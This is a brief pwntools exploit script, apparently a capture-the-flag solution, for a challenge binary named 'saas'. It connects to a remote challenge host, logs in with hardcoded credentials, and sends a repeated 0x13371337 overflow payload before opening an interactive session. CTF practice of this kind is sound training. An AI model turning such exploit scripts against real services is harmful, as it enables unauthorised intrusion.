#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('./saas')



def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

# -- Exploit goes here --

#io = start()
io = remote('io.ept.gg', 30004)
io.recvuntil(b'>')
io.sendline(b'1')
io.recvuntil(b'name: ')
io.sendline(b'Viipz')
io.recvuntil(b'word:')
io.sendline(b'HOLLY014')
io.recvuntil(b'>')
io.sendline(b'1')
io.recvuntil(b'>')
io.sendline(b'2')
io.recvuntil(b'Name: ')
io.sendline(b'kekburger')
io.recvuntil(b'back: ')
io.sendline(p32(0x13371337) * 25)
io.interactive()

